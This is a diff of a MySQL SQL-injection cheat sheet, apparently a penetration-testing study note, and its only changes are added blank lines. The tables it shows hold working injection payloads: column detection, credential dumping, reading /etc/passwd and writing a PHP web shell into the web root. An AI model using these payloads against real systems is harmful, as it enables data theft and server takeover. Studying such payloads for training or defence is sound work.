@@ -46,6 +46,7 @@ title: MySQL
 
 
 ### Union Injection
+
 | **Payload**   | **Description**   |
 | --------------|-------------------|
 | `' order by 1-- -` | Detect number of columns using `order by` |
@@ -54,6 +55,7 @@ title: MySQL
 | `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
 
 ### DB Enumeration
+
 | **Payload**   | **Description**   |
 | --------------|-------------------|
 | `SELECT @@version` | Fingerprint MySQL with query output |
@@ -65,6 +67,7 @@ title: MySQL
 | `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
 
 ### Privileges
+
 | **Payload**   | **Description**   |
 | --------------|-------------------|
 | `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
@@ -73,6 +76,7 @@ title: MySQL
 | `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
 
 ### File Injection
+
 | **Payload**   | **Description**   |
 | --------------|-------------------|
 | `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
@@ -80,6 +84,7 @@ title: MySQL
 | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
 
 ## MySQL Operator Precedence
+
 >  Division (`/`), Multiplication (`*`), and Modulus (`%`)
 > Addition (`+`) and Subtraction (`-`)
 > Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
